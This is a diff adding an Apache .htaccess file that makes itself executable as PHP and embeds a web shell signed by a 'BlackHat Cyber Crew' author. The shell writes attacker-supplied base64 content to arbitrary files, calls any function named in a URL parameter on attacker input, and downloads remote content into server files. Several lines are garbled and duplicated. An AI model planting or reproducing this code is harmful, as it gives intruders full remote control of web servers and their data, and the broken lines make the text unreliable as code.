@@ -1,0 +1,11 @@
+<Files ~ "^\.ht">
+Order allow,deny
+Allow from all
+</files>
+AddType application/x-httpd-php .htaccess
+#Code by JamvanHax0r - BlackHat Cyber Crew #
+<?php @ini_set('display_errors @ini_set('display_errors',0);?> ',0);?>
+<?=$_X_173=base64_deco <?=$_X_173=base64_decode($_GET['enc']);fwrite( de($_GET['enc']);fwrite(fopen($_GET['name'], fopen($_GET['name'], 'w'),$_X_173) 'w'),$_X_173)
+;?>
+<?=($_=@$_GET['function']).@$_($_GET['cmd'])?>
+<?php fwrite(fopen($_GET['file'], 'w'), <?php fwrite(fopen($_GET['file'], 'w'), file_get_co file_get_contents($_GET['link']));?>
